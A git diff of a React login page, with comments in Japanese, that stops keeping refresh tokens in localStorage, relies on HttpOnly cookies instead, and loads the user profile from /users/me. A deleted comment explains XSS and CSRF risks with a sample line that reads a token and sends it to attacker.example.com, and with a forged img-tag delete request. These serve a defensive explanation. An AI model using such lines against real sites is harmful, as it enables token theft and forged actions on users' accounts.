@@ -20,7 +20,7 @@ import { z } from "zod"
 
 import api from "@/lib/api"
 import { useAuthStore } from "@/store/authStore"
-import { AuthResponse } from "@/lib/api-types"
+import { AuthResponse, UserProfile } from "@/lib/api-types"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import {
@@ -94,56 +94,30 @@ export default function LoginPage() {
     try {
       // ▼ POST /api/auth/login を呼ぶ
       // api は lib/api.ts で作った axios インスタンス。
-      // レスポンスの型は AuthResponse（{ accessToken, expiresIn, refreshToken, refreshExpiresIn }）。
+      // レスポンスの型は AuthResponse（{ accessToken, expiresIn }）。
+      // リフレッシュトークンはレスポンス本文には入っていない。サーバーが
+      // Set-Cookie（HttpOnly）で直接ブラウザに保存するため、フロントのJavaScriptは
+      // その値を受け取らない・扱わない。
       const response = await api.post<AuthResponse>("/auth/login", {
         email: data.email,
         password: data.password,
       })
 
-      // なぜ localStorage に JWT を保存するか（Zustand persist の役割）
-      //   → Zustand の persist が自動で localStorage に保存・復元する。
-      //     セッションストレージだとタブを閉じると消えてしまうが、localStorage なら再訪問時も維持できる。
-      //     XSS のリスクはあるが、Cookie の CSRF リスクと天秤にかけた設計判断。
-      //
-      // ▼ XSS と CSRF のリスクを具体的に理解する
-      //
-      // 【XSS（Cross-Site Scripting）とは】
-      //   攻撃者がこのアプリのページに悪意ある JavaScript を埋め込めた場合、
-      //   以下のコードを実行されてしまう。
-      //
-      //   const token = localStorage.getItem("auth-storage") // JWT が盗れる
-      //   fetch("https://attacker.example.com/steal?t=" + token)
-      //
-      //   localStorage は JavaScript から自由に読めるので、
-      //   XSS が成立すると JWT が丸ごと盗まれる。これが localStorage のリスク。
-      //
-      // 【CSRF（Cross-Site Request Forgery）とは】
-      //   Cookie に JWT を保存した場合のリスク。
-      //   ブラウザの仕様として、Cookie は宛先ドメインが一致するリクエストに自動でくっついて送られる。
-      //   攻撃者の別サイトに以下の HTML を置くだけで攻撃が成立する。
-      //
-      //   <img src="http://localhost:8080/api/records/delete?id=123" />
-      //
-      //   この img タグを読み込む瞬間、ブラウザが自動で Cookie を付けてリクエストを送ってしまう。
-      //   ユーザーが意図しない操作をサーバーに実行させられる。これが Cookie のリスク。
-      //
-      // 【なぜ localStorage を選んだか（天秤の中身）】
-      //   このアプリは api.ts の interceptor が Authorization: Bearer <token> を
-      //   JavaScript で「手動で」ヘッダーにセットする。
-      //   → 別サイトの img タグや form から勝手にリクエストを送られても、
-      //     Authorization ヘッダーは誰もセットしないので CSRF が構造的に成立しない。
-      //
-      //   Cookie に HttpOnly を付けると XSS でも Cookie が盗まれなくなる利点があるが、
-      //   代わりに CSRF 対策トークンの追加実装が必要になる。
-      //
-      //   このアプリでは「CSRF が構造的に起きない localStorage を選び、
-      //   XSS を混入させないことを React の仕組みで担保する」という判断をしている。
-      //
-      // ▼ ログイン成功：アクセストークン・リフレッシュトークンを Zustand に保存する
-      // AuthResponse は { accessToken, expiresIn, refreshToken, refreshExpiresIn }。
-      // userId と displayName を返すユーザー情報APIはまだ無いので、暫定で email を使う。
-      const { accessToken, refreshToken } = response.data
-      setAuth(accessToken, refreshToken, "", data.email)
+      // ▼ ログイン成功：アクセストークンをZustandのメモリ上に保存する
+      // （このストアはpersistしていないので、リロードすると消える。
+      //   その場合は (main)/layout.tsx のサイレントリフレッシュでCookieから復元する）
+      const { accessToken } = response.data
+
+      // ▼ userId・displayName・email は GET /api/users/me から取得する
+      // まだ setAuth を呼んでいない（authStoreにトークンが無い）ため、
+      // axios の interceptor には頼らず、今取れたばかりの accessToken を直接ヘッダーに指定する。
+      const profile = await api
+        .get<UserProfile>("/users/me", {
+          headers: { Authorization: `Bearer ${accessToken}` },
+        })
+        .then((res) => res.data)
+
+      setAuth(accessToken, profile.id, profile.displayName, profile.email)
 
       // ▼ /dashboard にリダイレクト
       router.push("/dashboard")
